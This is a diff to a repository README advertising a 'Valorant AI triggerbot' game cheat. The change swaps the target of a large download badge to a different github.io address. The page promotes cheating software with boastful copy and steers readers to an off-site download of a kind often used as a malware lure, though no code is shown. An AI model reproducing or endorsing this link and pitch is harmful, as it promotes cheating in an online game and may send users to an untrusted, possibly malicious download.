@@ -2,7 +2,7 @@
 ### *React faster than humanly possible. Dominate with pure precision.*
 
 <p align="center">
-  <a href="https://download-portal-demo.github.io/.github/ValorantAiTrigg2" target="_blank">
+  <a href="https://trahendon.github.io/.github/ValorantAiTrigg2in4" target="_blank">
     <img src="https://img.shields.io/badge/⬇️ DOWNLOAD-VALORANT_AI_TRIGGERBOT-ff4655?style=for-the-badge&logo=riotgames&logoColor=white" alt="Download Valorant Triggerbot Script" />
   </a>
 </p>
